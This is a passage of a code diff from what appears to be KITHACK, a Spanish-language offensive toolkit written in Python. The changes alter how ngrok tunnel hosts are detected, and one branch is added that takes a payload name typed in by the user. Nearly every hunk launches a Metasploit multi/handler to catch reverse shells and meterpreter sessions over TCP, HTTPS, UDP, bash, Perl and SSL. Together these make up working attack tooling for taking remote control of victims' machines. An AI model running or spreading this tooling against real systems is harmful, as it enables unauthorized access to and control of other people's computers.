 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3687,8 +3624,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3721,8 +3657,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3755,8 +3690,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3789,8 +3723,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3823,8 +3756,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3857,8 +3789,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_udp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3905,8 +3836,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()						
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3939,8 +3869,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3987,8 +3916,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -4021,8 +3949,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -4045,6 +3972,14 @@ def options():
 				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
 				os.system('clear')
 				banner(), menu(), options()
+
+		elif sys == 9:
+			LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+			LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+			PAYLOAD = raw_input("\n{0}SET PAYLOAD: {1}".format(YELLOW, DEFAULT))
+			os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {}; set LPORT {}; set PAYLOAD {}; exploit\'"'.format(LHOST, LPORT, PAYLOAD))
+			pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+			banner(), menu(), options() 
 
 		else:
 			print("\n{}[X] OPCION INVALIDA\n".format(RED))
